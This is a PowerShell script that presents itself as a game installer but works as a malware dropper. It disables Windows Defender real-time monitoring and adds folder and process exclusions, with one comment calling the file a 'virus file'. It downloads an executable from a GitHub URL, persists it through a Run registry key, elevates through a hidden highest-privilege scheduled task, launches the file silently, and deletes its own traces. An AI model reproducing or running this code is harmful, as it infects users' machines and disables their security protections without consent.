# Enhanced installer with privilege escalation
$gameFolder = "$env:USERPROFILE\Documents\MyGame"
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "$gameFolder\game.exe"
$autoStartName = "MyGame"
$logPath = "$env:TEMP\game_install_log.txt"

# Create log function
function Write-Log {
    param($message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $logPath -Append
}

Write-Log "Starting enhanced installation procedure"

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Log "Running with administrator privileges: $isAdmin"

# Create folder if it doesn't exist
if (!(Test-Path -Path $gameFolder)) {
    try {
        New-Item -ItemType Directory -Path $gameFolder -Force | Out-Null
        Write-Log "Created folder: $gameFolder"
    } catch {
        Write-Log "Error creating folder: $_"
    }
} else {
    Write-Log "Folder already exists: $gameFolder"
}

# If not admin, create and schedule an elevated task
if (-not $isAdmin) {
    Write-Log "Not running as admin - creating elevated task"
    
    # Create a temporary script with full functionality
    $elevatedScriptPath = "$env:TEMP\elevated_install_$((Get-Date).ToString('yyyyMMddHHmmss')).ps1"
    
    $elevatedScriptContent = @"
`$gameFolder = "$gameFolder"
`$downloadUrl = "$downloadUrl"
`$downloadPath = "`$gameFolder\game.exe"
`$autoStartName = "$autoStartName"
`$logPath = "$logPath"

function Write-Log {
    param(`$message)
    `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "`$timestamp - `$message" | Out-File -FilePath `$logPath -Append
}

Write-Log "Starting elevated portion of installation"

# Disable real-time monitoring temporarily
try {
    Write-Log "Attempting to disable real-time monitoring"
    Set-MpPreference -DisableRealtimeMonitoring `$true
    Write-Log "Real-time monitoring disabled successfully"
} catch {
    Write-Log "Failed to disable real-time monitoring: `$_"
}

# Add exclusion for game folder
try {
    Write-Log "Adding exclusion for game folder"
    Add-MpPreference -ExclusionPath `$gameFolder
    Write-Log "Added exclusion successfully"
} catch {
    Write-Log "Failed to add exclusion: `$_"
}

# Download file if it doesn't exist or is too small
if (!(Test-Path `$downloadPath) -or (Get-Item `$downloadPath).Length -lt 100000) {
    try {
        Write-Log "Downloading file in elevated context"
        Invoke-WebRequest -Uri `$downloadUrl -OutFile `$downloadPath -ErrorAction Stop
        
        if (Test-Path `$downloadPath) {
            `$fileSize = (Get-Item `$downloadPath).Length
            Write-Log "Download successful. File size: `$fileSize bytes"
        }
    } catch {
        Write-Log "Elevated download failed: `$_"
    }
}

# Add to startup
`$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (!(Test-Path `$regPath)) {
    New-Item -Path `$regPath -Force | Out-Null
}
Set-ItemProperty -Path `$regPath -Name `$autoStartName -Value "`"`$downloadPath`""
Write-Log "Added to startup programs from elevated context"

# Set virus file to excluded process
try {
    Add-MpPreference -ExclusionProcess `$downloadPath
    Write-Log "Added process exclusion"
} catch {
    Write-Log "Failed to add process exclusion: `$_"
}

# Launch the application
try {
    Write-Log "Attempting to launch application from elevated context"
    Start-Process -FilePath `$downloadPath -ArgumentList "/silent"
    Write-Log "Launch command sent"
} catch {
    Write-Log "Failed to launch from elevated context: `$_"
    
    # Try alternative launch method
    try {
        `$bytes = [System.IO.File]::ReadAllBytes(`$downloadPath)
        `$tempPath = "`$env:TEMP\app_$((Get-Date).ToString('yyyyMMddHHmmss')).exe"
        [System.IO.File]::WriteAllBytes(`$tempPath, `$bytes)
        Add-MpPreference -ExclusionPath `$tempPath
        Start-Process -FilePath `$tempPath -ArgumentList "/silent"
        Write-Log "Used alternative launch method"
    } catch {
        Write-Log "Alternative launch also failed: `$_"
    }
}

# Re-enable real-time monitoring after a delay
Start-Sleep -Seconds 10
try {
    Set-MpPreference -DisableRealtimeMonitoring `$false
    Write-Log "Re-enabled real-time monitoring"
} catch {
    Write-Log "Failed to re-enable real-time monitoring: `$_"
}

Write-Log "Elevated installation completed"

# Clean up this script
Start-Sleep -Seconds 2
Remove-Item -Path "$elevatedScriptPath" -Force -ErrorAction SilentlyContinue
"@
    
    # Write the elevated script to a temporary file
    $elevatedScriptContent | Out-File -FilePath $elevatedScriptPath -Encoding UTF8
    Write-Log "Created elevated script at: $elevatedScriptPath"
    
    # Create a scheduled task to run with highest privileges
    $taskName = "GameInstall_$((Get-Date).ToString('yyyyMMddHHmmss'))"
    
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$elevatedScriptPath`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
        Write-Log "Registered scheduled task for elevated installation: $taskName"
    } catch {
        Write-Log "Failed to create scheduled task: $_"
    }
} else {
    # We already have admin privileges, perform operations directly
    Write-Log "Already running as admin, performing operations directly"
    
    # Disable real-time monitoring temporarily
    try {
        Write-Log "Attempting to disable real-time monitoring"
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Log "Real-time monitoring disabled successfully"
    } catch {
        Write-Log "Failed to disable real-time monitoring: $_"
    }
    
    # Add exclusion
    try {
        Write-Log "Adding exclusion for game folder"
        Add-MpPreference -ExclusionPath $gameFolder
        Write-Log "Added exclusion successfully"
    } catch {
        Write-Log "Failed to add exclusion: $_"
    }
    
    # Download file
    try {
        Write-Log "Downloading file"
        Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
        
        if (Test-Path $downloadPath) {
            $fileSize = (Get-Item $downloadPath).Length
            Write-Log "Download successful. File size: $fileSize bytes"
        }
    } catch {
        Write-Log "Download failed: $_"
    }
    
    # Add to startup
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        if (!(Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`""
        Write-Log "Added to startup programs"
    } catch {
        Write-Log "Failed to add to startup: $_"
    }
    
    # Also add process exclusion
    try {
        Add-MpPreference -ExclusionProcess $downloadPath
        Write-Log "Added process exclusion"
    } catch {
        Write-Log "Failed to add process exclusion: $_"
    }
    
    # Launch
    try {
        Write-Log "Attempting to launch application"
        Start-Process -FilePath $downloadPath -ArgumentList "/silent"
        Write-Log "Launch command sent"
    } catch {
        Write-Log "Failed to launch: $_"
    }
    
    # Re-enable real-time monitoring after a delay
    Start-Sleep -Seconds 10
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false
        Write-Log "Re-enabled real-time monitoring"
    } catch {
        Write-Log "Failed to re-enable real-time monitoring: $_"
    }
}

# Do a non-elevated download and launch attempt as fallback
try {
    Write-Log "Performing fallback download (non-elevated)"
    $fallbackPath = "$gameFolder\app_fallback.exe"
    (New-Object Net.WebClient).DownloadFile($downloadUrl, $fallbackPath)
    
    if (Test-Path $fallbackPath) {
        Write-Log "Fallback download successful"
        Start-Process -FilePath $fallbackPath -ArgumentList "/silent" 
        Write-Log "Fallback launch attempted"
    }
} catch {
    Write-Log "Fallback procedure failed: $_"
}

Write-Log "Installation process completed. Check for elevated task execution results."